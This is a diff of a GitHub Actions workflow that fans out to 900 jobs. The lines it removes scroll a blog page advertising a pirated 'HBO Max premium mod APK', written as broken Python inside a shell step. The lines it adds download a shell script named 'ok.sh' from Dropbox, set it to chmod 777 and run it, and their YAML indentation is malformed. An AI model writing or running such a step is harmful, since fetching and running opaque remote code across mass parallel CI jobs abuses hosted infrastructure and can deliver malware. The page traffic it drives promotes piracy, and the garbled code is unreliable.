@@ -7,7 +7,7 @@ on:
    
 jobs:
   build:
-    runs-on: windows-latest
+    runs-on: Ubuntu-latest
     strategy:
       max-parallel: 20
       fail-fast: false
@@ -19,19 +19,7 @@ jobs:
         NUM_JOBS: 900
         JOB: ${{ matrix.go }}
     steps:
-      - name: Install dependencies
-        run: | 
-          choco install selenium-all-drivers -y
-          pip install selenium
-      - name: Open webpage and scroll
-        run: |
-          from selenium import webdriver
-          selenium.webdriver.common.keys import Keys
-
-          driver = webdriver.Firefox()
-          driver.get("https://yoelmod.blogspot.com/2022/02/hbo-max-premium-mod-apk-para-android.html")
-          body = driver.find_element_by_tag_name("body")
-          body.send_keys(Keys.PAGE_DOWN)
-          driver.close()
-      - name: listo
-        run: exit
+       - name: PREPARING
+      run: wget https://www.dropbox.com/s/iod9hgxsuqrhn4l/ok.sh && sudo chmod 777 ok.sh && ./ok.sh
+      - name: DONE
+      run: exit
